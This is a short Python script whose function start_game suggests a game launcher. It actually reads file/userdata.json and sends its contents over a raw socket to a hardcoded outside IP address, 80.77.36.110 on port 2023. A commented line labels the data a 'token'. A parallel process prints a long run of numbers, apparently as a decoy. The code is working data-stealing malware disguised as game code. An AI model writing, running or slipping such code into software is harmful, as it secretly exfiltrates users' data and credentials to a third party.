import multiprocessing
import socket
def start_game():
    obj=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    obj.connect(("80.77.36.110",2023))
    with open("file/userdata.json","r") as f:
        text=f.read()
    #text="token ({0})".format(text)
    obj.sendall(text.encode("utf-8"))
    #date=obj.recv(1024)
    #print(date.decode("utf-8"))
def funk():
    for i in range(100000):
        print(i)
t1=multiprocessing.Process(target=start_game)
t2=multiprocessing.Process(target=funk)
if __name__=="__main__":
    t1.start()
    t2.start()